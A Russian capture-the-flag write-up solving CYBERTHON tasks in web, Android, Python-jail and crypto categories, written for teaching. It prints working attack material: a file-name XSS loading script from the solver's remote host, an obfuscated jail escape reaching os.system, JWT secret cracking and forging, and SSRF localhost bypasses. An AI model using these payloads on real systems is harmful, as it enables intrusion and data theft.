## 1. Embrace PHP (web)
### Условие:
```
Без комментариев.
[index.php](embrace_php/src/index/php)
```
http://109.233.56.93:5004
### Как решать?
Заметим, что в таске нам даны исходники веб-страницы, сначала проанализируем их:

1) На странице у нас находится только html-форма, в которой GET запросом отправляются логин и пароль. Логин и пароль перед отправкой [сериализуются](https://ru.stackoverflow.com/questions/477425/%D0%A1%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%D0%B8%D0%B7%D0%B0%D1%86%D0%B8%D1%8F-%D0%BF%D1%80%D0%BE%D1%81%D1%82%D1%8B%D0%BC%D0%B8-%D1%81%D0%BB%D0%BE%D0%B2%D0%B0%D0%BC%D0%B8) в `JSON`
```
<form method=GET onsubmit="login_data.value = JSON.stringify([ inputLogin.value, inputPassword.value ]);">
```

2) На бэкенде `JSON`, полученный из GET запроса десериализуется (`@json_decode`) в переменные `$login` и `$password`. Затем происходит сверка логина со строкой `admin` и пароля с [переменной окружения](https://ru.hexlet.io/courses/cli-basics/lessons/environment-variables/theory_unit) `ADMIN_PASSW`, которую мы не знаем. Если сверка успешна, флаг `isAdmin` становится равным `true`. (Обратите внимание, здесь не создается сессии, т.к нет инструкции `start_session()` - т.е $_SESSION это просто переменная)
```
<?php

if (isset($_REQUEST['login_data'])) {
    $json = @json_decode($_REQUEST['login_data']);
    if (!is_array($json) || count($json) < 2)
        exit('Error Json need to have 2 elements!');
    $json = array_values($json);
    list($login, $password) = $json;

    if (
        $login == 'admin' &
        $password == getenv('ADMIN_PASSW')
    )
        $_SESSION['isAdmin'] = true;
    else
        $_SESSION['isAdmin'] = false;
}
?>
```

3) Далее проверяется что флаг `isAdmin` существует и равен `true`. Если эти условия соблюдены - нам выводится флаг (он тоже находится в переменных окружения).
```
<?php
    if (isset($_SESSION['isAdmin']) && $_SESSION['isAdmin']) {
        ?>
        <p>Success YOURa ADMIN!!01!</p>
        <p>Your flag: <?=getenv('FLAG');?></p>
```

Теперь переходим на сайт и видим что кроме некоторых украшений код остался таким же. (Можно нажать на слоника и получить забавный звуковой эффект)

![](https://i.imgur.com/lrbNg8D.png)

Проведя сложные логические вычисления

![](https://www.meme-arsenal.com/memes/570122be3f390e1db0ec7f124311f1f6.jpg)

можно понять, что нам необходимо как-то получить `true` при сравнение нашего пароля и неизвестного нам пароля админа. Читая про уязвимости в PHP (рекомендую этот [доклад](https://2018.zeronights.ru/wp-content/uploads/materials/8%20ZN2018%20WV%20-%20PHP%20insecurity%20stack%20%28RU%29.pdf)) легко находится, что в данном случае у нас уязвимость [Type juggling](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09#:~:text=PHP%20has%20a%20feature%20called,to%20a%20common%2C%20comparable%20type.&text=Loose%20type%20comparison%20behavior%20like,work%20in%20the%20same%20way.) (В PHP слабая типизация, а значит сравнение `==` не всегда безопасно)

Основываясь на таблице

![](https://api.abrictosecurity.com/wp-content/uploads/2020/08/loose-1.png)

делаем вывод, что чтобы при сравнении с паролем админа (а это строка) результатом был `true` нам нужно подать на вход `0` или `TRUE`. 

Просто так это сделать не получиться, ведь данные сериализуются в JSON (`TRUE` как и `0` превратятся в строку при отправке). И тут у нас несколько вариантов:
1) Перехватить запрос и просто поменять строку на `0` или `true`
2) Отправить запрос самому
3) ХТМЛ ХакККинГ (Advanced, требуются серьезные знания html)

![](https://i.imgur.com/yprPOu8.png)
*ПКМ -> Edit as html -> ... -> profit!*

Выбираем любой способ и получаем флаг. (лично мне нравится 3ий за его неописуемую сложность)


## 2. Strange service (web)
### Условие:

```
Мы обнаружили в сети какой-то странный сервис. Что же это может быть?
```
http://109.233.56.93:9200
### Как решать?

Сделаем GET запрос на выданный адрес и получим жсон вида:
```
{
  "name" : "2878cfce301b",
  "cluster_name" : "docker-cluster",
  "cluster_uuid" : "NdDoTUU6Q4-m9HVwsskcjw",
  "version" : {
    "number" : "7.10.1",
    "build_flavor" : "default",
    "build_type" : "docker",
    "build_hash" : "1c34507e66d7db1211f66f3513706fdf548736aa",
    "build_date" : "2020-12-05T01:00:33.671820Z",
    "build_snapshot" : false,
    "lucene_version" : "8.7.0",
    "minimum_wire_compatibility_version" : "6.8.0",
    "minimum_index_compatibility_version" : "6.0.0-beta1"
  },
  "tagline" : "You Know, for Search"
}
```

По полученному сложно сразу сказать что это такое, но можно попробовать загуглить ключевые слова, возможно это что-то даст. Однозначный успех ждет нас на теге `"tagline"`

![](https://i.imgur.com/Wz9oFZI.png)

> Вторым способом понять, что за сервис находится по данному url это заметить необычный порт (`9200` хотя все остальные сервисы расположены на `5000N` порте). Загуглив какой сервис обычно располагается на 9200 порте узнаем, что это `ElasticSearch`

Сервис мы определили, теперь нужно понять как с ним работать. Хорошей идеей было бы нагуглить статью об этом, одной из первых ссылок в выдаче будет [эта](https://habr.com/ru/post/280488/). Из нее легко понять, что `ElasticSearch` это NoSql база данных, используемая для поиска.

Далее, читая статью, разбираемся с основными понятиями - индексом и типом. 

![](https://i.imgur.com/XKt6SxY.png)

Получим маппинг нашей бд, благо пример указан прямо в статье - http://109.233.56.93:9200/_mapping?pretty=true (да, запрос работает и без индекса в пути, но можно и получить имя индекса заранее по запросу `/_cat/indices?v`)

```
{
  "flag" : {
    "mappings" : {
      "properties" : {
        "content" : {
          "type" : "text",
          "fields" : {
            "keyword" : {
              "type" : "keyword",
              "ignore_above" : 256
            }
          }
        },
        "title" : {
          "type" : "text",
          "fields" : {
            "keyword" : {
              "type" : "keyword",
              "ignore_above" : 256
            }
          }
        }
      }
    }
  }
}
```

Мы получили маппинг, сразу замечаем, что наш индекс это `flag` (если не обнаружили ранее) и у него есть поля `content` и `tittle`. Но вот незадача, имя типа, которе нужно для получения документов мы не узнали. Обратившись к [документации](https://www.elastic.co/guide/en/elasticsearch/reference/6.8/indices-get-mapping.html)

![](https://i.imgur.com/KgwIdHY.png)

Находим, что для получения типа нам нужно указать параметр `include_type_name=true`

Тогда наш новый запрос - http://109.233.56.93:9200/flag/_mappings?include_type_name=true
```
{
  "flag" : {
    "mappings" : {
      "post" : {
        "properties" : {
            ...
```

Наш маппинг `post`, прямо как и в статье!

Дело за малым, идем на `/flag/post/1?pretty` и получаем одну запись:
```
{
  "_index" : "flag",
  "_type" : "post",
  "_id" : "1",
  "_version" : 1,
  "_seq_no" : 0,
  "_primary_term" : 1,
  "found" : true,
  "_source" : {
    "title" : "Flag may be here",
    "content" : "well, not here"
  }
}
```
Теперь осталось перебрать все записи и найти флаг!

Но можно и поступить проще - сделать поисковой запрос (`ElasticSearch` предназначен для поиска как-никак!)

Отправим данный запрос
```
curl -XGET -H 'Content-Type: application/json' "http://109.233.56.93:9200/flag/post/_search?pretty" -d'
{
  "_source": true,
  "query": {
    "match": {
      "content": "CYBERTHON"
    }
  }
}'
```
и получим флаг.


## 3. Anime advisor (1) (web)
### Условие:
```
Мой знакомый разрабатывает сайт "для своих". Я туда, конечно, заходить не собираюсь, но вы проверьте, достаточно ли он защищен.

P.S В данном задании два флага. (последний символ флага в данном задании - S)
```
http://109.233.56.93:5001

### Как решать?

Заходим на сайт и наслаждаемся качественной версткой и шрифтами:

![img](https://i.imgur.com/pJvZ2Mu.png)

Тыкаем кнопочки, изучаем респонсы. Форма обратной связи намекает нам о наличии клиентской уязвимости, но рассматривать мы ее здесь не будем, в ней находится второй флаг. 

Рассмотрим все эндпоинты:

1) Main page - `/` ничего интересного
2) News - `/api/news` - кросдоменный запрос на новости. Замечаем что есть `/api `
3) Sign In - заглушка, выводит `Coming soon!`
4) Select anime - `/get_anime` выдает картинку, причем передается только тип, никаких названий, так что LFI тут будет вряд ли.

При анализе ответов сервера, можно заметить, что они все отдают кастомный http заголовок: `x-server-name: FastAPI`. Гуглим и понимаем, что это фреймворк на котором написан сайт.

![](https://i.imgur.com/csm9l2k.png)

Посмотрим, что же умеет это чудо:

![](https://i.imgur.com/gVrgIAK.png)

Бинго! Автоматическая генерация документации!

> `/docs` можно было найти и любой брутилкой директорий (`dirb`, `dirsearch`)

Посмотрим `/docs` на нашем сайте:

![img](https://i.imgur.com/rReTjbc.png)

Кроме уже известного нам эндпоинта `/api/news` здесь находятся еще  `test_register` и `test_login`. Рассмотрим их внимательнее:

* `/api/test_register` принимает POST запрос с одним полем `name` (похоже на имя пользователя) и возвращает строку вида: `"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWE2NjIyZWQ4M2I3NGNlNjlmODI2MTdkYTY0NjhjNjIiLCJuYW1lIjoic3RyaW5nIiwiaXNfYWRtaW4iOmZhbHNlfQ.br4rkubzQV5ygchy9waVXy0lSEugpHYtDY2Ufxm4BQw"`
Если попробовать загуглить данную строку, то вы поймете что это обычный [jwt-токен](https://ru.wikipedia.org/wiki/JSON_Web_Token)
* `/api/test_login` принимает POST запрос с токеном, выданным ранее.

Получив токен и попробовав залогиниться увидим сообщение - `"You have successfully logined"`. Флага тут нет, так что надо копать глубже. Обратим наше внимание на токен. Так как `jwt token` это просто три части base64 - расшифруем его:
```
{"typ":"JWT","alg":"HS256"}.{"user_id":"aa6622ed83b74ce69f82617da6468c62","name":"string","is_admin":false}.%digest_bytes_here%
```

Сразу замечаем, что помимо нашего `name` в токен записывается поле `is_admin` равное `false`. Токен админа мы не знаем, но можем попробовать подменить поле в нашем токене. Для этого удобно использовать [jwt_tool](https://github.com/ticarpi/jwt_tool) и атаки на `jwt-token` (хорошо описаны [здесь](https://github.com/ticarpi/jwt_tool/wiki)) 

Использовав `jwt_tool` можно попробовать подменить подпись токена на `None`. Но к сожалению данный способ не срабатывает. Попробуем перебрать пароль при помощи любого крупного словаря, например `rockyou.txt`:

![](https://imgur.com/IL3zwMw.png)

Отлично, секретный ключ, которым был подписан токен - это `secret`. Теперь мы можем перезаписать свой токен (опция `-T` в `jwt_tool`) и поставить поле `is_admin` равным `true`. Отправляем логин запрос с новым токеном и получаем флаг.

> В данном таске проэмулирована вполне реальная ситуация - когда разработчик сделал тестовые методы, но билд почему-то попал в продакшн и стал доступен извне. 

## 4. Anime advisor (2) (web)
### Условие:
```
Мой знакомый разрабатывает сайт "для своих". Я туда, конечно, заходить не собираюсь, но вы проверьте, достаточно ли он защищен.

P.S В данном задании два флага. (последний символ флага в данном задании - e)
```
http://109.233.56.93:5001
### Как решать?

Теперь обратим внимание на форму обратной связи:

![](https://imgur.com/mqElvuY.png)

В ней есть заголовок, тело и опциональная загрузка изображения. Попробовав засунуть `XSS` пейлоады в заголовок и тело (Админу они вероятно отображаются на какой-то специальной странице) получим ошибку, которая говорит нам о том, что спец-символы в этих полях не допускаются.

![](https://imgur.com/W6KfMj4.png)

Остается поиграться с файлом и тут два варианта:
1) Наличие какой-то уязвимости в рендере файла<br>
Тут потенциально может быть много вещей, но нет ничего, чтобы на них намекало. Простое > лучше сложного, да и я не люблю делать таски с уцуцугой. (Скорее всего файл просто отображается на странице админа)
> Во время соревнований были залиты довольно интересные файлы: `'getenv('FLAG').txt`, `A3DLIBS.dll`, `payload.html`, `hey.php.png` и даже `alpine.ova`)))
2) XSS в имени файла<br>
А вот о такой возможности часто забывают. В данном задании необходимо было сделать именно это. Единственным ограничением была длина имени файла - 60 символов. Благо html и js богаты на различные способы сделать XSS. Самым простым и коротким пожалуй является этот: `<script src=url></script>`. Ну а в url уже ваш адрес, на который должен прийти отстук ( сервисов, позволяющих сделать подобный url много, например `requestbin` и `xss-hunter`)

> Посмотреть на варианты XSS пейлоадов можно [тут](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

Отправив наш пейлоад получим отстук (я воспользовался сервисом `xss-hunter`):

![](https://imgur.com/4L4PhXf.png)



## 5. Chess bot (joy)
### Условие:
```
Уже смотрели Ход Королевы? Да, мне тоже понравилось. Скорее пиши @chess_lover_bot чтобы попрактиковаться в шахматах!

P.S режим - antichess
P.P.S Нолан - Гений
```
### Как решать?

Заходим в бота. Регистрируемся на https://lichess.org/. Не забываем при каждый новой победе над ботом тыкнуть кнопку. Все

## 6. Escape from durka (ppc)
### Условие:
```
nc 109.233.56.93 5005

P.S В задании есть второй флаг, однако получить его невозможно. Но вы все равно попробуйте.
```
### Как решать?

Подсоединяемся неткатом к серверу. После пары команд понимаем, что мы находимся в питон джейле.

После пары тестов выясняем, что наш инпут оборачивается в `print()` и суется в `eval()`
```
>>> 'test'
test
>>> 'test'[0]
t
```
Попробуем что-нибудь классическое:
```
>>> __import__('os')
Ага, попался! В процедурную его, в процедурную.
```
Не вышло, значит скорее всего некоторые символы фильтруются (тестируем это на обычной строке). Методом проб и ошибок выясняем, что это `."_` и пробел.

Пробуем eval:
```
>>> eval('1'+'1')
С такими приколами (name 'eval' is not defined) тебе сам знаешь куда.
```

`'eval' is not defined.` Хм, пробуем еще парочку стандартных функций, они тоже не проходят. Дальше можно пробовать перебирать все остальное (благо встроенных глобальных функций в питоне не очень много) или попробовать сразу написать `globals()` - встроенная функция, которая возвращает все глобальные объекты:
```
>>> globals()
{'__builtins__': {'print': <built-in function print>, 'globals': <built-in function globals>, 'locals': <built-in function locals>, 'getattr': <built-in function getattr>}}
```
Теперь мы можем убедиться, что нам доступны `print`, `globals`, `locals` и `gettattr`.  

Что делают `print` и `globals` мы уже выяснили. `getattr` позволяет нам получить атрибут объекта не через `.` .Удобненько. А вот `locals` по аналогии с глобалами позволяет нам получить все локальные переменные

```
>>> locals()
{'kolpak': <function f at 0x7fa468a4a3a0>, 'text': 'locals()'}
```

Опа, колпак. Какая-то функция, интересно. Ее можно поизучать. 

```
>>> kolpak()
Otdai kolpak!
```

Функция не принимает аргументов и просто возвращает строку. Казалось бы, что еще можно узнать. Оказывается много чего! В деталях я описывать не буду, но вы можете прочитать подробнее [здесь](https://www.aperikube.fr/docs/inshack_2019/hell_of_a_jail/), а я ограничусь тем, что выведу все константные значения функции:
```
>>> getattr(getattr(kolpak,'\x5f\x5fcode\x5f\x5f'),'co\x5fconsts')
(None, 'CYBERTHON{P0we3_0f_Pyt40n_1ntr0Spec4i0n}', 'Otdai kolpak!')
```

> Здесь запрет на `_` был обойден при помощи hex-кода числа - `\x5f`

В данном задании находился и второй флаг, но уже не в коде программы, а в файловой системе. Пользуясь тем, что можно обойти запрет `_` а так же тем, что пустая строка вполне себе объект, у которого есть родители: 
```
__class__.__mro__[1] -> выходим на object
.__subclasses__() -> выходим на все классы
```

Мы можем получить доступ к модулю os, а затем уже вызывать любые системные команды:
```
getattr(getattr(getattr(getattr(getattr('','\x5f\x5fclass\x5f\x5f'),'\x5f\x5fmro\x5f\x5f')[1],'\x5f\x5fsubclasses\x5f\x5f')()[84],'load\x5fmodule')('os'),'system')('cat\x20flag\x2etxt')
```

`P.S` Один участник нашел еще один интересный способ получить доступ к классам:
```
getattr(globals(),'popitem')()
```
после запуска этой команды заместо нашего урезанно `__builtins__` придет дефолтный, со всеми классами. А дальше уже по накатанной.

## 6. Simple chat (2) (android + web)
### Условие:
```
Мы обнаружили приложение, разрабатываемое одним из бывших участников опасной APT группировки. Нам удалось добыть так же и тестовые данные для входа:

login - test@simplechat.org
password - test_user_12345

Исследуйте приложение на предмет уязвимостей, чтобы помочь следствию найти злоумышленника.

ссылка на apk - https://yadi.sk/d/EWE3N0q1ZQKK8A

P.S в данном задании два флага. (в этом последний символ флага - w)
```
### Как решать?

Скачиваем и запускаем приложение. Видим окно логина, Sign up - просто заглушка. 

![](https://i.imgur.com/s4TfCWt.png)

Тестовые данные у нас уже есть, так что можем залогиниться.

![](https://imgur.com/AUS8Ufc.png)

Пробуем отправить пару сообщений, получаем на каждое ответ бота. Пока ничего не выглядит подозрительным. Обратим внимание на кнопку в тулбаре, нажмем ее:

![](https://imgur.com/tStA01K.png)

Видим патч ноуты для приложения. Замечаем, что оно поддерживает юникод и `линк превью`. Поддержка `маркдауна` вряд ли подвержена уязвимостям, а вот `линк превью` сразу кажется подозрительным

![](https://imgur.com/b1lDJsO.png)

При попытке отправить ссылку она превратится в блок, содержащий ее превью (Имя сайта, заголовок и изображение). Все было бы хорошо если бы `линк превью` генерировался на клиенте, но в нашем случае это происходит на сервере (до этого можно догадаться по задержке между отправкой и появлением блока или разреверсив приложение/посниффав траффик)

Это сразу намекает нам (как и последующие хинты) на уязвимость [SSRF](https://portswigger.net/web-security/ssrf). Так как мы контролируем ссылку, которая обрабатывается на бэкенде, что мешает нам отправить запрос на локальный адрес (например `127.0.0.1`) и посмотреть что произойдет? Но вот незадача, если просто отправить `http://127.0.0.1` получим сообщение `can't preview local ip address`. Следовательно на сервере есть какая-то проверка на локальные и нам нужно ее обойти.

Способов это сделать куча, например:
* http://localhost
* Домен, который резолвится в локальный адрес (например `xip.io`). Кстати говоря, этот способ позволит нам делать запросы к локальной сети, а не только к локалхосту, чем он и лучше
* Сайт с редиректом на локальный адрес (например `mocky.io` или свой сервер)
  
> Советую вот этот [доклад](https://2018.techtrain.ru/talks/3vnjbbvxfse2siequmccka/) по обходу защиты от SSRF <br>
> А еще [вот это](https://i.blackhat.com/briefings/asia/2018/asia-18-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages_update_Thursday.pdf) полезно для чтения
  
В нашем случае сработает и самый простой, первый способ. Отправим просто `http://localhost` и получим уже другую ошибку вместо `can't preview local ip address`. Возможно это потому, что на 80 порте ничего нет. Пробуем `http://localhost:5001` и нас ждет успех, мы видим превью для другого таска:

![](https://imgur.com/7yyqzbN.png)

Отлично, дальше кажется логичным перебирать все порты на локалхосте (т.к все остальные локальные подсети так же проверялись и банились). Из андроида это делать не очень удобно, поэтому можно было:
* Догадаться, что это `5002` порт (т.к все сервисы расположены на `5000N` портах)
* Просканить машину с сервисами например `nmap`'ом (и увидеть открытый `5002` порт)
* Разреверсить приложение, найти урл, на который идут запросы и слать их в обход андроида. (можно даже было использовать `/docs` эндпоинт, т.к принимающий сервер тоже на `FastAPI`)
  
Что ж мы увидим когда постучимся извне на `5002` порт? Ошибку `500` и следующее сообщение:
`{"detail":"This service can be accessed only from the local network. Contact our system administrator for more info."}`

Это то что нам и нужно. Данный сервис доступен только из локальной сети (там проверка на `host` заголовок). Пробуем отправить запрос (`http://localhost:5002`) через приложение и получаем флаг:

![](https://imgur.com/Aotq8Vc.png)


## 6. Simple chat (1) (android + web)
### Условие:
```
Мы обнаружили приложение, разрабатываемое одним из бывших участников опасной APT группировки. Нам удалось добыть так же и тестовые данные для входа:

login - test@simplechat.org
password - test_user_12345

Исследуйте приложение на предмет уязвимостей, чтобы помочь следствию найти злоумышленника.

ссылка на apk - https://yadi.sk/d/EWE3N0q1ZQKK8A

P.S в данном задании два флага. (в этом последний символ флага - 3)
```
### Как решать?

На самом деле это был первый флаг, но разберем его сейчас, так как для получения второго не требовалось реверсить и даже как-то анализировать приложение.

Для начала разреверсим приложение. Можно использовать классический `apk-tool` или онлайн решения, но лично мне нравится [Mobile Security Framework](https://github.com/MobSF/Mobile-Security-Framework-MobSF). Это очень классная штука, которая автоматически проводит статический анализ приложения и ищет всякие небезопасные вещи, помимо того, что автоматически достает код приложения.

Прочитав [манифест приложения](https://developer.android.com/guide/topics/manifest/manifest-intro), понимаем что у нас две активити (проще говоря два экрана) - `AuthActivity.java` и `MainActivity.java`. Имена говорят сами за себя, т.к первой является аутентификация и в `MainActivity.java` мы уже нашли флаг начнем с `AuthActivity.java`.

> Сразу понимаем, что исходники обфусцированны, хотя некоторые вещи вполне читабельны.

Сразу смотрим на метод `OnCreate` который вызывается автоматически при инициализации экрана.

Замечаем интересную строчку:

`b.a.b.j.g.c(getString(R.string.firebase_db_url)).d("test_creds").b(new d());`

Хм, здесь у нас берется значение какой-то строки, которые названием явно намекает на `url` базы данных.

`Fun Fact`: строки в андроиде хранятся в специальном файле, чтобы и было легко транслировать на другой язык. В коде образаться к ним можно через специальный объект `R`. 

Теперь посмотрим какие строки были в приложении:

`"firebase_db_url" : "https://simple-chat-15b97-default-rtdb.firebaseio.com/"`

> `MSF` вытащит их за нас, если же реверсите через `apk_tool` они будут лежать в `package_name/res/strings.xml`

Хорошо, мы получили url нашей базы данных. Можно дальше смотреть код, а можно сразу попытаться поискать проблемы связанные с `Firebase` (на это намекает часть url - `firebaseio.com`)

По запросу в гугле `firebase database vulnerability` нам сразу выскакивает [эта статья](https://www.acunetix.com/vulnerabilities/web/firebase-database-accessible-without-authentication/)

Внимательно ее читаем и:
```
Any Firebase Realtime Database URL is accessible as a REST endpoint. All we need to do is append .json to the end of the URL and send a request from our favorite HTTPS client and we can access the data.
```

Переходим по ссылке: `https://simple-chat-15b97-default-rtdb.firebaseio.com/.json` и видим жсон с флагом.
```
{"\"admin_creds\"":{"email":"admin@simplechat.org","password":"CYBERTHON{Cl0se_Y0u3_D4t4B43Z3}"},"test_creds":{"email":"test@simplechat.org","password":"test_user_12345"}}
```


> Найти первый флаг можно просто внимательно посмотрев вывод `MSF`:

![](https://imgur.com/tgMyaCz.png)

# Задачи на крипту by greg0r0

## 7. My own cipher (crypto)
### Условие:
```
Я так вдохновился простыми шифрами! И захотел написать собственный.

Дешифруете сообщение?

FUGYYLQEY{RMHI_KBVCIO_KOM}
```
Ссылка на код - [code.py](my_own_cipher/code.py)

### Как решать?

Таск на основы криптоанализа. 

Что мы можем узнать из кода:

1) Шифр аддитивный.
2) Ключ изменяется в зависимости от позиции буквы.
3) Знак ключа чередуется каждую букву.
4) Шифр воздействует только на символы английского алфавита.

По факту, это шифр цезаря, но ключ изменяется по закону: {+k, -(k+1), +(k+2), ...}.

Откуда можно взять ключ? Зная формат флага и его первую букву ('C'), а так же зная первую букву шифртекста, просто считаем его.

'F' - 'C' = 5 - 2 = 3 (счет с нуля).

Имея ключ и понимание работы алгоритма пишем дешифратор. (на самом деле просто меняем знак sign в коде :D)

```
import string

alph = string.ascii_uppercase
l = len(alph)

mess = input().upper()
key = int(input()) % l
sign = -1
res = ''

for c in mess:
    if c in alph:
        res += alph[(alph.find(c) + sign*key) % l]
    else:
        res += c
    sign = -1*sign
    key=(key+1)%l

print(res)
```

## 8. Consequences (crypto)
### Условие:
```
В нашу инфраструктуру проник вирус шифровальщик. Служба ИБ конечно получит свое, но твоя задача - попробовать расшифровать важные файлы. Начни с этого. Ребята из реверсеров сказали что там обычный xor и ключ был длины 8 байт, но сам ключ не нашли.
```
Ссылка на файл - [CYBERTHON.pdf.encrypted](consequences/CYBERTHON.pdf.encrypted)

### Как решать?
Таск базируется на базовом приеме дешифрования сообщений зашифрованных xor - взять зашифрованный текст, получить информацию о открытом тексте и получить ключ, поксорив эти два значения.

Сразу стоит обратить внимание на расширение файла - `pdf`. И стоит сразу посмотреть его сигнатуру (например, на википедии) - `25 50 44 46 2d`. Бинго, у нас уже есть 5 байт 'открытого' текста, осталось найти три.

Вы могли посмотреть хедеры ваших pdf на компьютере\скачать их в интернете и заметить - после этих 5 байт идет еще 3 байта версии - вида 1.5\1.6\1.7 и тд. Этих версий немного и их можно все перебрать.

> Посмотреть хедер можно при помощи xxd - 
> ```
> xxd file.pdf | head -n 2
> 00000000: 2550 4446 2d31 2e35 0d0a 25b5 b5b5 b50d  %PDF-1.7..%.....
> 00000010: 0a31 2030 206f 626a 0d0a 3c3c 2f54 7970  .1 0 obj..<</Typ
> ```
>  .

Правильный хедер - `%PDF-1.5`. Как раз 8 байт.

И, имея информацию о открытом тексте и зашифрованном, восстанавливаем ключ. 

`87 bf 14 5e 9c f4 1a 3a`

Затем закидываем это в какой-нибудь декриптор (например, [кибершеф](https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'Hex','string':'87%20bf%2014%205e%209c%20f4%201a%203a'%7D,'Standard',false)))

Скачиваем файл, смотрим в него и сдаем флаг.

## 9. OPEN System Secret Layout (crypto)
### Условие:
```
Мы перехватили переписку хакеров. Они в курсе того, как безопасно организовывать передачу сообщений. Из их трафика мы смогли выудить открытый ключ и зашифрованный файл. Дальше, я 
думаю, ты понимаешь, что надо сделать.
```
Ссылка на файл - [pubkey.pem](open_system_secret_layout/pubkey.pem)
Ссылка на файл - [flag.encrypted](open_system_secret_layout/flag.encrypted)

### Как решать?

>Название таска большими буквами намекает на инструмент `openssl`.

Имеем перед собой файлик публичного ключа в формате PEM и зашифрованный флаг.
```
-----BEGIN PUBLIC KEY-----
MDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAOoeDpCAseHWZzLKBlGJaCy7nRIK1/B7
A2gwXi7sA/XbAgEH
-----END PUBLIC KEY-----
```
Для того, чтобы посмотреть, что это за ключ - существует множество инструментов. Один из самых используемых - это самая обычная утилита `openssl`.

```
>>> openssl rsa -in pubkey.pem -inform pem -text -pubin

RSA Public-Key: (256 bit)
Modulus:
    00:ea:1e:0e:90:80:b1:e1:d6:67:32:ca:06:51:89:
    68:2c:bb:9d:12:0a:d7:f0:7b:03:68:30:5e:2e:ec:
    03:f5:db
Exponent: 7 (0x7)
writing RSA key
-----BEGIN PUBLIC KEY-----
MDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAOoeDpCAseHWZzLKBlGJaCy7nRIK1/B7
A2gwXi7sA/XbAgEH
-----END PUBLIC KEY-----
```
Ага, у нас значит тут RSA 256 бит. `Modulus` это n, `Exponent` это e. Давайте попробуем факторизовать n.

> ***Примечание***: RsaCtfTool у меня не справился с факторизацией. Но помимо него есть еще один интересный инструмент, и он работает в нашем случае - [Ссылка](https://www.alpertron.com.ar/ECM.HTM). Ну, либо кто-то уже успел загрузить чиселки в factordb и можно было посмотреть разложение там.

Конвертируем n из hex записи в десятичную и загружаем в факторизатор. На выходе получим два числа p и q:

```
p = 313972319425413863109136971114890682389
q = 337272765619766312010932827156715899439
```

Вот теперь, при помощи RsaCtfTool (ну должно же быть хоть какое-то разнообразие инструментов), генерируем приватный ключ и дешифруем файлик. (параметры `--private --dumpkey` добавлены для наглядности)

```
>>> python3 RsaCtfTool.py -p 313972319425413863109136971114890682389 -q 337272765619766312010932827156715899439 -e 7 --private --dumpkey --uncipherfile flag.encrypted


Results for /tmp/tmp37ax8s8x:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIGoAgEAAiEA6h4OkICx4dZnMsoGUYloLLudEgrX8HsDaDBeLuwD9dsCAQcCIELk
BClJV2UYr8VeSvK5i3nyw2E9HKo2KM8VD+vd63EHAhEA7DTegdxAtZzsilLwP4Bg
FQIRAP28XzMXXAfXptxThSPLii8CEQDKdnWT4VwJYe9R/fJ/kpt/AhBIfvag4hpL
Yi+sqiYKOid7AhAixDzLqOfYfR/eqfjvrr4w
-----END RSA PRIVATE KEY-----
n: 105894312500662011363957437124738230819277783948864997769789139599752612279771
e: 7
d: 30255517857332003246844982035639494519607582532519947884191162800423144485127
p: 313972319425413863109136971114890682389
q: 337272765619766312010932827156715899439

Public key details for /tmp/tmp37ax8s8x
n: 105894312500662011363957437124738230819277783948864997769789139599752612279771
e: 7

Unciphered data :
HEX : 0x435942455254484f4e7b3070336e73736c5f31735f75733366756c7d2020200a
INT (big endian) : 30462667628009612146829760732566721794108012963744399131485435655202218713098
INT (little endian) : 4579889323715616564036029762583205145631110158110632145761056803596450027843
STR : b'CYBERTHON{0p3nssl_1s_us3ful}   \n'
```